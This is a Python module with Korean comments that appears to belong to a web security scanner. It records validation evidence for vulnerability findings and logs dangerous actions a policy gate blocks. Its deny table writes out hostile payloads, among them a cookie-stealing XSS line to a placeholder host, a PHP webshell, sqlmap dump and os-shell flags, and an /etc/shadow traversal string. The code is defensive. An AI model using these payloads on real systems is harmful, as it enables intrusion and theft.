"""
proof_validation.py — Proof-Oriented Validation Framework v1: 오케스트레이터.

목적: 이미 발견된 Finding/Candidate 를 '가능성 있음'이 아니라 '증거 기반 확인' 관점으로
정리한다. 활성 프로파일에서 허용되는 안전 기법만 계획하고, 위험 행위는 Proof Policy Gate
로 차단하며, 확보된(무해) 증거로 Rule Engine 이 판정한 Level 을 문서화한다.

안전 불변식:
  - 기본 프로파일 SAFE(신규 공격 실행 없음). 강한 검증은 승인 프로파일에서만 '허용'.
  - Level/판정은 Rule Engine(evidence_levels/proof_mode) 전담. 본 모듈은 변경하지 않는다.
  - 위험 행위(dump/shell/exfil/write/state-change/brute/internal)는 항상 차단하고 기록한다.
"""
from __future__ import annotations

import evidence_levels as evl
import validation_profiles as vp
import proof_policy as pp

# 유형별 '항상 금지'되는 대표 위험 행위 — 보고서의 "안전상 수행하지 않은 위험 행위" 기록용.
_RISKY_ACTIONS: dict[str, list[dict]] = {
    "sqli": [
        {"technique": "full_dump", "payload": "--dump-all", "data_scope": "full",
         "label": "DB 전체/테이블 덤프"},
        {"technique": "cred_extract", "payload": "select password from users",
         "data_scope": "records", "label": "credential/hash 추출"},
        {"technique": "os_shell", "payload": "--os-shell", "label": "OS 셸 획득"},
    ],
    "xss": [
        {"technique": "session_exfil", "payload": "new Image().src='//evil/'+document.cookie",
         "label": "세션 탈취/외부 전송 payload"},
    ],
    "idor": [
        {"technique": "state_change", "method": "DELETE", "changes_state": True,
         "label": "타 계정 객체 변경/삭제"},
    ],
    "path_traversal": [
        {"technique": "sensitive_file", "payload": "../../../../etc/shadow", "data_scope": "records",
         "label": "민감 파일(shadow/private key) 읽기"},
    ],
    "ssrf": [
        {"technique": "cloud_metadata", "target": "http://169.254.169.254/latest/meta-data/",
         "internal_target": True, "label": "클라우드 메타데이터 접근"},
        {"technique": "internal_scan", "target": "http://127.0.0.1/", "internal_target": True,
         "label": "내부망 스캔/loopback 접근"},
    ],
    "file_upload": [
        {"technique": "webshell", "payload": "<?php system($_GET['c']); ?>", "writes_file": True,
         "label": "웹쉘 업로드"},
    ],
    "open_redirect": [
        {"technique": "phishing_redirect", "payload": "//evil-phishing.example",
         "label": "피싱/자격증명 탈취 리다이렉트"},
    ],
    "service": [
        {"technique": "brute_force", "payload": "credential stuffing",
         "label": "brute force / credential stuffing"},
        {"technique": "mail_send", "label": "실제 메일 발송(open relay 악용)"},
    ],
}

# Rule Engine 이 판정한 Level(evidence_levels)을 '증거 중심' 문구로 설명.
_EVIDENCE_NOTE = {
    3: "브라우저 실행/응답 데이터 등 직접 증거로 취약이 확인되었습니다.",
    2: "응답 차이·fingerprint·controlled callback 등 read-only 증거가 확보되었습니다.",
    1: "취약 후보가 관찰되었으나 실증 증거는 아직 확보되지 않았습니다.",
    0: "정보 수준 항목입니다.",
}


def _family_of(f: dict) -> str:
    fam = f.get("family") or f.get("vuln_type") or ""
    if fam:
        return vp.norm_family(fam)
    title = (f.get("title") or "").lower()
    for key, fam in (("sql", "sqli"), ("xss", "xss"), ("idor", "idor"),
                     ("traversal", "path_traversal"), ("lfi", "path_traversal"),
                     ("ssrf", "ssrf"), ("upload", "file_upload"),
                     ("redirect", "open_redirect")):
        if key in title:
            return fam
    if f.get("scan_category") == "service" or f.get("service"):
        return "service"
    return ""


def _evidence_signals(f: dict, level: int) -> list[str]:
    """Finding 에 실제로 담긴 무해 증거를 사람이 읽을 신호 목록으로."""
    sigs = []
    conf = (f.get("confidence") or "").upper()
    if conf in ("CONFIRMED_BROWSER",):
        sigs.append("브라우저 JavaScript 실행 확인")
    if conf in ("CONFIRMED_RESPONSE", "CONFIRMED"):
        sigs.append("응답 데이터 기반 증거")
    if f.get("probe_confirmed") is True:
        sigs.append("능동 점검 실증")
    for key, lbl in (("dbms", "DBMS fingerprint"), ("injection_type", "Injection Type"),
                     ("sqlmap_injectable", "SQLMap injectable"),
                     ("callback_received", "controlled callback 수신"),
                     ("cross_account_read", "교차 계정 read 성공")):
        if f.get(key):
            sigs.append(lbl)
    if not sigs and level >= 2:
        sigs.append("read-only 응답 증거")
    if not sigs:
        ed = (f.get("evidence_detail") or "").strip()
        if ed:
            sigs.append("관찰 근거: " + ed[:60])
    return sigs


def _blocked_actions_for(family: str, profile: str, scope: list | None) -> list[dict]:
    """유형별 위험 행위를 게이트에 넣어 '차단됨'을 확정적으로 기록."""
    out = []
    for ra in _RISKY_ACTIONS.get(family, []):
        act = {"family": family, **{k: v for k, v in ra.items() if k != "label"}}
        res = pp.evaluate(act, profile=profile, scope=scope)
        out.append({"action": ra.get("label", ra.get("technique", "")),
                    "technique": ra.get("technique", ""),
                    "decision": res["decision"], "reason": res["reason"]})
    return out


def validate_finding(f: dict, *, profile: str | None = None, scope: list | None = None) -> dict:
    """단일 Finding 에 대한 Proof Validation 레코드 생성(신규 공격 없음)."""
    prof = (profile or vp.current_profile()).upper()
    fam = _family_of(f)
    # Rule Engine 이 판정한 현재 Level(본 모듈은 변경하지 않음)
    proven_level = evl.level_of(f)
    baseline_level = 1 if proven_level >= 1 else 0   # 후보 관찰 = Level 1 기준선
    performed = vp.allowed_techniques(fam, prof) if fam else []
    blocked = _blocked_actions_for(fam, prof, scope) if fam else []
    signals = _evidence_signals(f, proven_level)
    promoted = proven_level > baseline_level
    # 안전상 '수행하지 않은' 항목: 위험 행위 라벨 목록
    not_performed = [b["action"] for b in blocked]
    return {
        "finding_title": f.get("title", ""),
        "family": fam or "generic",
        "profile": prof,
        "current_level": proven_level,
        "baseline_level": baseline_level,
        "suggested_level": proven_level,          # Rule Engine 판정 그대로(증거 문서화)
        "promoted": promoted,
        "promotion": (f"Level {baseline_level} → Level {proven_level}" if promoted else "-"),
        "performed_techniques": performed,
        "evidence_signals": signals,
        "blocked_actions": blocked,
        "not_performed": not_performed,
        "verification_note": _EVIDENCE_NOTE.get(proven_level, ""),
    }


def run_proof_validation(analysis: dict, *, scope: list | None = None,
                         profile: str | None = None) -> dict:
    """analysis.findings 전체에 Proof Validation 을 적용하고 요약을 산출한다."""
    prof = (profile or vp.current_profile()).upper()
    if scope is None:
        scope = (analysis.get("network_exposure_summary") or {}).get("input_targets") \
            or ([analysis.get("domain")] if analysis.get("domain") else [])
    findings = [f for f in (analysis.get("findings") or []) if f.get("judgment") != "양호"]
    records = [validate_finding(f, profile=prof, scope=scope) for f in findings]

    l1_l2 = sum(1 for r in records if r["current_level"] >= 2)
    l2_l3 = sum(1 for r in records if r["current_level"] >= 3)
    promoted = sum(1 for r in records if r["promoted"])
    blocked_total = sum(len(r["blocked_actions"]) for r in records)
    by_reason: dict[str, int] = {}
    manual = 0
    for r in records:
        for b in r["blocked_actions"]:
            by_reason[b["decision"]] = by_reason.get(b["decision"], 0) + 1
            if b["decision"] == pp.MANUAL_APPROVAL_REQUIRED:
                manual += 1
    summary = {
        "profile": prof,
        "requested_profile": vp.requested_profile(),
        "downgraded": vp.was_downgraded(),
        "allow_advanced": vp.allow_advanced(),
        "allow_proof": vp.allow_proof(),
        "proof_validations": len(records),
        "level_promotions": promoted,
        "l1_to_l2": l1_l2,
        "l2_to_l3": l2_l3,
        "blocked_validations": blocked_total,
        "blocked_by_reason": by_reason,
        "manual_approval_required": manual,
        "budget": vp.budget(),
    }
    return {"proof_validation": records, "proof_validation_summary": summary,
            "proof_validation_config": vp.config_snapshot()}
